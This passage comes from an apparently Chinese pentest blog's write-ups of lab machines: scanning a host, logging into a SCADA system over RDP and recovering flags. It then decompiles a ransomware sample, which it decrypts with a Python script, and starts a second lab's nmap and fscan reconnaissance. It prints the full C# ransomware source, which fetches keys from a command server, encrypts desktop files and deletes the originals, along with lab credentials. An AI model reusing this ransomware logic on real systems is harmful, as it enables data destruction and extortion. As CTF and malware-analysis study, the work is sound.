172.22.26.11:139<br><span class="hljs-comment">[4.8s]</span>     扫描完成, 发现 5 个开放端口<br><span class="hljs-comment">[4.8s]</span>     存活端口数量: 5<br><span class="hljs-comment">[4.8s]</span>     开始漏洞扫描<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[*]</span> NetInfo 扫描结果<br>目标主机: 172.22.26.11<br>主机名: WIN-SCADA<br>发现的网络接口:<br>   IPv4地址:<br>      └─ 172.22.26.11<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[+]</span> NetBios 172.22.26.11    WORKGROUP\WIN-SCADA           <br><span class="hljs-comment">[4.8s]</span>     POC加载完成: 总共387个，成功387个，失败0个<br><span class="hljs-comment">[4.8s]</span> <span class="hljs-comment">[+]</span> MSSQL 172.22.26.11:1433 sa 123456<br><span class="hljs-comment">[5.2s]</span> <span class="hljs-comment">[*]</span> 网站标题 http://172.22.26.11       状态码:200 长度:703    标题:IIS Windows Server<br><span class="hljs-comment">[5.6s]</span>     扫描已完成: 9/9<br></code></pre></td></tr></table></figure><p>拿到信息</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">172.22.26.11</span>    WORKGROUP\WIN-SCADA <br></code></pre></td></tr></table></figure><p>rdp 连接</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">Administrator:</span>IYnT3GyCiy3<br></code></pre></td></tr></table></figure><p>进到了个控制系统，打开锅炉送 flag</p><p><img src="https://img.dkdun.cn/v1/2025/12/39da527642fe8dbe.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;bcd080d5-<span class="hljs-number">2</span>cf1-<span class="hljs-number">4095</span>-ac15-fa4bef9ca1c0&#125;<br></code></pre></td></tr></table></figure><h1 id="NET-逆向解密-RSA-AES"><a href="#NET-逆向解密-RSA-AES" class="headerlink" title=".NET 逆向解密 RSA&#x2F;AES"></a>.NET 逆向解密 RSA&#x2F;AES</h1><p>桌面有一个 title 为 如何解密你的文件 的文件，一看就是勒索病毒，桌面还有个被加密的 ScadaDB.sql.locky</p><p><img src="https://img.dkdun.cn/v1/2025/12/2508c29f1d3cacc4.png"></p><p>在 C 盘中找到了勒索病毒程序 Lockyou.exe，检查发现是 C#，找到主要加密逻辑</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-keyword">using</span> System;<br><span class="hljs-keyword">using</span> System.IO;<br><span class="hljs-keyword">using</span> System.Net;<br><span class="hljs-keyword">using</span> System.Security.Cryptography;<br><span class="hljs-keyword">using</span> System.Text;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Lockyou.LockyCore</span><br>&#123;<br><span class="hljs-comment">// Token: 0x02000004 RID: 4</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title">AESCrypto</span><br>&#123;<br><span class="hljs-comment">// Token: 0x0600000C RID: 12 RVA: 0x00002280 File Offset: 0x00000480</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">AESCrypto</span>()</span><br>&#123;<br><span class="hljs-keyword">this</span>.BACKEND_URL = <span class="hljs-string">&quot;http://39.101.170.47/&quot;</span>;<br><span class="hljs-keyword">this</span>.PRIVATE_KEY = <span class="hljs-keyword">this</span>.GetHttpContent(<span class="hljs-keyword">this</span>.BACKEND_URL + <span class="hljs-string">&quot;privateKey&quot;</span>);<br><span class="hljs-keyword">this</span>.AES_KEY_ENC = <span class="hljs-keyword">this</span>.GetHttpContent(<span class="hljs-keyword">this</span>.BACKEND_URL + <span class="hljs-string">&quot;encryptedAesKey&quot;</span>);<br><span class="hljs-keyword">this</span>.AES_KEY = <span class="hljs-keyword">this</span>.DecryptRSA(<span class="hljs-keyword">this</span>.AES_KEY_ENC, <span class="hljs-keyword">this</span>.PRIVATE_KEY);<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600000D RID: 13 RVA: 0x000023E4 File Offset: 0x000005E4</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> <span class="hljs-title">GetHttpContent</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> url</span>)</span><br>&#123;<br>HttpWebRequest httpWebRequest = (HttpWebRequest)WebRequest.Create(url);<br>httpWebRequest.Method = <span class="hljs-string">&quot;GET&quot;</span>;<br>httpWebRequest.ContentType = <span class="hljs-string">&quot;application/x-www-form-urlencoded&quot;</span>;<br><span class="hljs-built_in">string</span> str = Convert.ToBase64String(Encoding.ASCII.GetBytes(<span class="hljs-string">&quot;C2bAseUs2r:C@PsasR2&quot;</span>));<br>httpWebRequest.Headers[HttpRequestHeader.Authorization] = <span class="hljs-string">&quot;Basic &quot;</span> + str;<br>HttpWebResponse httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();<br><span class="hljs-built_in">string</span> result;<br><span class="hljs-keyword">using</span> (StreamReader streamReader = <span class="hljs-keyword">new</span> StreamReader(httpWebResponse.GetResponseStream()))<br>&#123;<br>result = streamReader.ReadToEnd();<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600000E RID: 14 RVA: 0x00002484 File Offset: 0x00000684</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-built_in">byte</span>[] <span class="hljs-title">DecryptRSA</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> encryptedData, <span class="hljs-built_in">string</span> privateKey</span>)</span><br>&#123;<br><span class="hljs-built_in">byte</span>[] result;<br><span class="hljs-keyword">using</span> (RSACryptoServiceProvider rsacryptoServiceProvider = <span class="hljs-keyword">new</span> RSACryptoServiceProvider())<br>&#123;<br>rsacryptoServiceProvider.FromXmlString(privateKey);<br><span class="hljs-built_in">byte</span>[] rgb = Convert.FromBase64String(encryptedData);<br>result = rsacryptoServiceProvider.Decrypt(rgb, <span class="hljs-literal">false</span>);<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x0600000F RID: 15 RVA: 0x000024D0 File Offset: 0x000006D0</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-built_in">int</span> <span class="hljs-title">EncryptFileStart</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> insureKey</span>)</span><br>&#123;<br>MD5 md = <span class="hljs-keyword">new</span> MD5CryptoServiceProvider();<br>StringBuilder stringBuilder = <span class="hljs-keyword">new</span> StringBuilder();<br><span class="hljs-built_in">byte</span>[] array = md.ComputeHash(Encoding.Default.GetBytes(insureKey));<br><span class="hljs-keyword">for</span> (<span class="hljs-built_in">int</span> i = <span class="hljs-number">0</span>; i &lt; array.Length; i++)<br>&#123;<br>stringBuilder.Append(array[i].ToString(<span class="hljs-string">&quot;x2&quot;</span>));<br>&#125;<br><span class="hljs-built_in">bool</span> flag = stringBuilder.ToString() != <span class="hljs-string">&quot;7a2ca8a306260205c1cd46dad0fbd598&quot;</span>;<br><span class="hljs-built_in">int</span> result;<br><span class="hljs-keyword">if</span> (flag)<br>&#123;<br>Console.WriteLine(<span class="hljs-string">&quot;Incorrect insurance key!&quot;</span>);<br>result = <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br><span class="hljs-built_in">int</span> num = <span class="hljs-number">0</span>;<br><span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">string</span> searchPattern <span class="hljs-keyword">in</span> <span class="hljs-keyword">this</span>.FILE_TYPES)<br>&#123;<br><span class="hljs-built_in">string</span>[] files = Directory.GetFiles(<span class="hljs-keyword">this</span>.DESKTOP_PATH, searchPattern);<br><span class="hljs-keyword">foreach</span> (<span class="hljs-built_in">string</span> text <span class="hljs-keyword">in</span> files)<br>&#123;<br><span class="hljs-keyword">this</span>.EncryptFile(text, text + <span class="hljs-string">&quot;.locky&quot;</span>);<br>num++;<br>&#125;<br>&#125;<br>result = num;<br>&#125;<br><span class="hljs-keyword">return</span> result;<br>&#125;<br><br><span class="hljs-comment">// Token: 0x06000010 RID: 16 RVA: 0x000025D0 File Offset: 0x000007D0</span><br><span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title">EncryptFile</span>(<span class="hljs-params"><span class="hljs-built_in">string</span> inputFile, <span class="hljs-built_in">string</span> outputFile</span>)</span><br>&#123;<br><span class="hljs-keyword">using</span> (AesCryptoServiceProvider aesCryptoServiceProvider = <span class="hljs-keyword">new</span> AesCryptoServiceProvider())<br>&#123;<br>aesCryptoServiceProvider.Key = <span class="hljs-keyword">this</span>.AES_KEY;<br>aesCryptoServiceProvider.GenerateIV();<br><span class="hljs-keyword">using</span> (ICryptoTransform cryptoTransform = aesCryptoServiceProvider.CreateEncryptor())<br>&#123;<br><span class="hljs-keyword">using</span> (FileStream fileStream = <span class="hljs-keyword">new</span> FileStream(inputFile, FileMode.Open))<br>&#123;<br><span class="hljs-keyword">using</span> (FileStream fileStream2 = <span class="hljs-keyword">new</span> FileStream(outputFile, FileMode.Create))<br>&#123;<br><span class="hljs-keyword">using</span> (CryptoStream cryptoStream = <span class="hljs-keyword">new</span> CryptoStream(fileStream2, cryptoTransform, CryptoStreamMode.Write))<br>&#123;<br>fileStream2.Write(aesCryptoServiceProvider.IV, <span class="hljs-number">0</span>, aesCryptoServiceProvider.IV.Length);<br>fileStream.CopyTo(cryptoStream);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>File.Delete(inputFile);<br>&#125;<br><br><span class="hljs-comment">// Token: 0x04000007 RID: 7</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> BACKEND_URL;<br><br><span class="hljs-comment">// Token: 0x04000008 RID: 8</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> PRIVATE_KEY;<br><br><span class="hljs-comment">// Token: 0x04000009 RID: 9</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> AES_KEY_ENC;<br><br><span class="hljs-comment">// Token: 0x0400000A RID: 10</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">byte</span>[] AES_KEY;<br><br><span class="hljs-comment">// Token: 0x0400000B RID: 11</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span> DESKTOP_PATH = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);<br><br><span class="hljs-comment">// Token: 0x0400000C RID: 12</span><br><span class="hljs-keyword">private</span> <span class="hljs-built_in">string</span>[] FILE_TYPES = <span class="hljs-keyword">new</span> <span class="hljs-built_in">string</span>[]<br>&#123;<br><span class="hljs-string">&quot;*.txt&quot;</span>,<br><span class="hljs-string">&quot;*.xlsx&quot;</span>,<br><span class="hljs-string">&quot;*.jpg&quot;</span>,<br><span class="hljs-string">&quot;*.png&quot;</span>,<br><span class="hljs-string">&quot;*.gif&quot;</span>,<br><span class="hljs-string">&quot;*.pdf&quot;</span>,<br><span class="hljs-string">&quot;*.mp4&quot;</span>,<br><span class="hljs-string">&quot;*.wav&quot;</span>,<br><span class="hljs-string">&quot;*.mp3&quot;</span>,<br><span class="hljs-string">&quot;*.bak&quot;</span>,<br><span class="hljs-string">&quot;*.docx&quot;</span>,<br><span class="hljs-string">&quot;*.pptx&quot;</span>,<br><span class="hljs-string">&quot;*.gif&quot;</span>,<br><span class="hljs-string">&quot;*.zip&quot;</span>,<br><span class="hljs-string">&quot;*.csv&quot;</span>,<br><span class="hljs-string">&quot;*.sql&quot;</span>,<br><span class="hljs-string">&quot;*.ini&quot;</span>,<br><span class="hljs-string">&quot;*.html&quot;</span>,<br><span class="hljs-string">&quot;*.php&quot;</span>,<br><span class="hljs-string">&quot;*.js&quot;</span>,<br><span class="hljs-string">&quot;*.css&quot;</span>,<br><span class="hljs-string">&quot;*.py&quot;</span>,<br><span class="hljs-string">&quot;*.cs&quot;</span>,<br><span class="hljs-string">&quot;*.cpp&quot;</span>,<br><span class="hljs-string">&quot;*.c&quot;</span><br>&#125;;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>结合附件写出解密脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Cipher <span class="hljs-keyword">import</span> AES, PKCS1_v1_5<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> os<br><br>AES_KEY_ENC_B64 = <span class="hljs-string">&quot;lFmBs4qEhrqJJDIZ6PXvOyckwF/sqPUXzMM/IzLM/MHu9UhAB3rW/XBBoVxRmmASQEKrmFZLxliXq789vTX5AYNFcvKlwF6+Y7vkeKMOANMczPWT8UU5UcGi6PQLsgkP3m+Q26ZD9vKRkVM5964hJLVzogAUHoyC8bUAwDoNc7g=&quot;</span><br><br>RSA_KEY_XML = <span class="hljs-string">&quot;&quot;&quot;&lt;RSAKeyValue&gt;&lt;Modulus&gt;uoL2CAaVtMVp7b4/Ifcex2Artuu2tvtBO25JdMwAneu6gEPCrQvDyswebchA1LnV3e+OJV5kHxFTp/diIzSnmnhUmfZjYrshZSLGm1fTwcRrL6YYVsfVZG/4ULSDURfAihyN1HILP/WqCquu1oWo0CdxowMsZpMDPodqzHcFCxE=&lt;/Modulus&gt;&lt;Exponent&gt;AQAB&lt;/Exponent&gt;&lt;P&gt;2RPqaofcJ/phIp3QFCEyi0kj0FZRQmmWmiAmg/C0MyeX255mej8Isg0vws9PNP3RLLj25O1pbIJ+fqwWfUEmFw==&lt;/P&gt;&lt;Q&gt;2/QGgIpqpxODaJLQvjS8xnU8NvxMlk110LSUnfAh/E6wB/XUc89HhWMqh4sGo/LAX0n94dcZ4vLMpzbkVfy5Fw==&lt;/Q&gt;&lt;DP&gt;ulK51o6ejUH/tfK281A7TgqNTvmH7fUra0dFR+KHCZFmav9e/na0Q//FivTeC6IAtN5eLMkKwDSR1rBm7UPKKQ==&lt;/DP&gt;&lt;DQ&gt;PO2J541wIbvsCMmyfR3KtQbAmVKmPHRUkG2VRXLBV0zMwke8hCAE5dQkcct3GW8jDsJGS4r0JsOvIRq5gYAyHQ==&lt;/DQ&gt;&lt;InverseQ&gt;JS2ttB0WJm223plhJQrWqSvs9LdEeTd8cgNWoyTkMOkYIieRTRko/RuXufgxppl4bL9RRTI8e8tkHoPzNLK4bA==&lt;/InverseQ&gt;&lt;D&gt;tuLJ687BJ5RYraZac6zFQo178A8siDrRmTwozV1o0XGf3DwVfefGYmpLAC1X3QAoxUosoVnwZUJxPIfodEsieDoxRqVxMCcKbJK3nwMdAKov6BpxGUloALlxTi6OImT6w/roTW9OK6vlF54o5U/4DnQNUM6ss/2/CMM/EgM9vz0=&lt;/D&gt;&lt;/RSAKeyValue&gt;&quot;&quot;&quot;</span>  <span class="hljs-comment"># 你前面发的 XML RSA Key</span><br><br><span class="hljs-comment"># 3. 加密文件路径</span><br>ENCRYPTED_FILE = <span class="hljs-string">&quot;ScadaDB.sql.locky&quot;</span><br><br><span class="hljs-comment"># 4. 解密后输出路径</span><br>DECRYPTED_OUTPUT = <span class="hljs-string">&quot;ScadaDB.sql&quot;</span><br><span class="hljs-comment"># --------------------------------------------------</span><br><br><span class="hljs-comment"># 将 XML 转换为 RSA 私钥对象</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rsa_key_from_xml</span>(<span class="hljs-params">xml_str</span>):<br>    <span class="hljs-keyword">import</span> xml.etree.ElementTree <span class="hljs-keyword">as</span> ET<br>    tree = ET.fromstring(xml_str)<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">b64</span>(<span class="hljs-params">tag</span>): <span class="hljs-keyword">return</span> <span class="hljs-built_in">int</span>.from_bytes(base64.b64decode(tree.find(tag).text), <span class="hljs-string">&#x27;big&#x27;</span>)<br>    n = b64(<span class="hljs-string">&#x27;Modulus&#x27;</span>)<br>    e = b64(<span class="hljs-string">&#x27;Exponent&#x27;</span>)<br>    d = b64(<span class="hljs-string">&#x27;D&#x27;</span>)<br>    p = b64(<span class="hljs-string">&#x27;P&#x27;</span>)<br>    q = b64(<span class="hljs-string">&#x27;Q&#x27;</span>)<br>    <span class="hljs-keyword">return</span> RSA.construct((n, e, d, p, q))<br><br><span class="hljs-comment"># 解密 AES Key</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_aes_key</span>(<span class="hljs-params">enc_b64, rsa_key</span>):<br>    cipher_rsa = PKCS1_v1_5.new(rsa_key)<br>    enc_bytes = base64.b64decode(enc_b64)<br>    <span class="hljs-comment"># Sentinel: used if padding check fails</span><br>    sentinel = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">return</span> cipher_rsa.decrypt(enc_bytes, sentinel)<br><br><span class="hljs-comment"># 解密 .locky 文件</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_locky_file</span>(<span class="hljs-params">enc_file, out_file, aes_key</span>):<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(enc_file, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        iv = f.read(<span class="hljs-number">16</span>)<br>        ciphertext = f.read()<br>    cipher = AES.new(aes_key, AES.MODE_CBC, iv)<br>    decrypted = cipher.decrypt(ciphertext)<br>    <span class="hljs-comment"># 去除 PKCS#7 Padding</span><br>    pad_len = decrypted[-<span class="hljs-number">1</span>]<br>    decrypted = decrypted[:-pad_len]<br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(out_file, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(decrypted)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成: <span class="hljs-subst">&#123;out_file&#125;</span>&quot;</span>)<br><br>rsa_key = rsa_key_from_xml(RSA_KEY_XML)<br>aes_key = decrypt_aes_key(AES_KEY_ENC_B64, rsa_key)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密出 AES 密钥: <span class="hljs-subst">&#123;aes_key.<span class="hljs-built_in">hex</span>()&#125;</span>&quot;</span>)<br>decrypt_locky_file(ENCRYPTED_FILE, DECRYPTED_OUTPUT, aes_key)<br><br></code></pre></td></tr></table></figure><p>解出来之后在 sql 文件中找到 flag04</p><p><img src="https://img.dkdun.cn/v1/2025/12/c6f2ffdb7bcef3b2.png"></p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">flag</span>&#123;<span class="hljs-number">63</span>cd8cd5-<span class="hljs-number">151</span>f-<span class="hljs-number">4</span>f29-bdc7-f80312888158&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>渗透</category>
      
      <category>靶机</category>
      
      <category>春秋云镜</category>
      
    </categories>
    
    
    <tags>
      
      <tag>内网渗透 Heapdump 内存泄露 Shiro 反序列化 注册表 SAM 转储</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>春秋云镜-Initial</title>
    <link href="/2025/07/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/"/>
    <url>/2025/07/18/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Initial/</url>
    
    <content type="html"><![CDATA[<p>文件上传、DCSync</p><span id="more"></span><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs bash">└─# nmap -sS -sV -Pn -A 39.99.133.101<br>Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-07-18 00:59 CST<br>Nmap scan report <span class="hljs-keyword">for</span> 39.99.133.101<br>Host is up (0.064s latency).<br>Not shown: 986 closed tcp ports (reset)<br>PORT     STATE    SERVICE        VERSION<br>22/tcp   open     ssh            OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey:<br>|   3072 f5:ca:b4:23:30:80:1d:cf:ea:13:a0:d9:56:ff:f6:84 (RSA)<br>|   256 17:84:60:d7:a9:<span class="hljs-built_in">fc</span>:e1:ec:ea:31:a3:8c:55:12:1f:85 (ECDSA)<br>|_  256 ed:73:ff:53:03:1f:b4:<span class="hljs-built_in">df</span>:14:05:8c:40:64:7d:f2:1c (ED25519)<br>42/tcp   filtered nameserver<br>80/tcp   open     http           Apache httpd 2.4.41 ((Ubuntu))<br>|_http-title: Bootstrap Material Admin<br>|_http-server-header: Apache/2.4.41 (Ubuntu)<br>135/tcp  filtered msrpc<br>139/tcp  filtered netbios-ssn<br>445/tcp  filtered microsoft-ds<br>593/tcp  filtered http-rpc-epmap<br>1025/tcp filtered NFS-or-IIS<br>1068/tcp filtered instl_bootc<br>1434/tcp filtered ms-sql-m<br>3128/tcp filtered squid-http<br>4444/tcp filtered krb524<br>5800/tcp filtered vnc-http<br>5900/tcp filtered vnc<br>Aggressive OS guesses: Linux 2.6.32 (88%), Linux 2.6.39 (88%), Linux 3.10 - 3.12 (88%), Linux 3.4 (88%), Linux 3.5 (88%), Linux 4.4 (88%), Synology DiskStation Manager 5.1 (88%), WatchGuard Fireware 11.8 (88%), Linux 2.6.35 (87%), Linux 3.10 (87%)<br>No exact OS matches <span class="hljs-keyword">for</span> host (<span class="hljs-built_in">test</span> conditions non-ideal).<br>Network Distance: 12 hops<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br></code></pre></td></tr></table></figure><p>开了很多端口</p><h2 id="fscan"><a href="#fscan" class="headerlink" title="fscan"></a>fscan</h2><p>fscan 扫一下，thinkphp 5.0.23 版本，有漏洞，这是一个 rce</p><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">aWeb</span>\<span class="hljs-title">fscan</span>-<span class="hljs-title">main</span>&gt;.\<span class="hljs-title">fscan.exe</span> -<span class="hljs-title">h</span> 39.99.133.101</span><br><span class="hljs-function"></span><br><span class="hljs-function">   <span class="hljs-title">___</span>                              <span class="hljs-title">_</span></span><br><span class="hljs-function">  / <span class="hljs-title">_</span> \     <span class="hljs-title">___</span>  <span class="hljs-title">___</span> <span class="hljs-title">_</span> <span class="hljs-title">__</span> <span class="hljs-title">__</span> <span class="hljs-title">_</span>  <span class="hljs-title">___</span>| | <span class="hljs-title">__</span></span><br><span class="hljs-function"> / /<span class="hljs-title">_</span>\/<span class="hljs-title">____</span>/ <span class="hljs-title">__</span>|/ <span class="hljs-title">__</span>| &#x27;<span class="hljs-title">__</span>/ <span class="hljs-title">_</span>` |/ <span class="hljs-title">__</span>| |/ /</span><br><span class="hljs-function">/ /<span class="hljs-title">_</span>\\<span class="hljs-title">_____</span>\<span class="hljs-title">__</span> \ (<span class="hljs-title">__</span>| | | (<span class="hljs-title">_</span>| | (<span class="hljs-title">__</span>|   &lt;</span><br><span class="hljs-function">\<span class="hljs-title">____</span>/     |<span class="hljs-title">___</span>/\<span class="hljs-title">___</span>|<span class="hljs-title">_</span>|  \<span class="hljs-title">__</span>,<span class="hljs-title">_</span>|\<span class="hljs-title">___</span>|<span class="hljs-title">_</span>|\<span class="hljs-title">_</span>\</span><br><span class="hljs-function">                     <span class="hljs-title">fscan</span> <span class="hljs-title">version</span>: 1.8.4</span><br><span class="hljs-function"><span class="hljs-title">start</span> <span class="hljs-title">infoscan</span></span><br><span class="hljs-function">39.99.133.101:22 <span class="hljs-title">open</span></span><br><span class="hljs-function">39.99.133.101:80 <span class="hljs-title">open</span></span><br><span class="hljs-function">[*] <span 